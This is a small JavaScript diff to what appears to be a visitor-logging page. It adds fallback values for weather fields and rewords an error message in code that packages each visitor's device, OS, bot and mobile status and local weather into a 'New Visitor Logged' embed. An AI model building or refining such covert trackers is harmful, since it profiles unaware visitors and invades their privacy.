@@ -113,6 +113,11 @@
         weather = weatherData.current_condition[0];
       }
 
+      let weatherDescription = "N/A";
+      if (weather && weather.lang_en && Array.isArray(weather.lang_en) && weather.lang_en.length > 0) {
+        weatherDescription = weather.lang_en[0].value || "N/A";
+      }
+
       const embed = {
         title: "🕵️ New Visitor Logged",
         color: 0x00ffff,
@@ -150,10 +155,10 @@
           { name: "Mobile", value: safeGet(data, ['security', 'is_mobile'], false) ? "Yes" : "No", inline: true },
           { name: "Bot", value: safeGet(data, ['security', 'is_bot'], false) ? "Yes" : "No", inline: true },
           ...(weather ? [
-            { name: "Weather", value: `${weather.lang_en[0].value} - Feels like ${weather.FeelsLikeC}°C`, inline: true },
-            { name: "Temperature", value: `${weather.temp_C}°C`, inline: true },
-            { name: "Humidity", value: `${weather.humidity}%`, inline: true },
-            { name: "Wind Speed", value: `${weather.windspeedKmph} km/h`, inline: true },
+            { name: "Weather", value: `${weatherDescription} - Feels like ${weather.FeelsLikeC || "N/A"}°C`, inline: true },
+            { name: "Temperature", value: `${weather.temp_C || "N/A"}°C`, inline: true },
+            { name: "Humidity", value: `${weather.humidity || "N/A"}%`, inline: true },
+            { name: "Wind Speed", value: `${weather.windspeedKmph || "N/A"} km/h`, inline: true },
           ] : []),
           { name: "Device Model", value: uaInfo.device, inline: true },
           { name: "Operating System", value: uaInfo.os, inline: true },
@@ -168,7 +173,7 @@
     } catch (err) {
       const errorDiv = document.getElementById('error-message');
       errorDiv.style.display = "block";
-      errorDiv.textContent = `Error:\n${err.message}\n\nClick to copy this error message.`;
+      errorDiv.textContent = `Error:\n${err.message}\n\nClick to copy error message.`;
       errorDiv.onclick = () => {
         navigator.clipboard.writeText(err.message)
           .then(() => alert("Error message copied! Send it to me."))
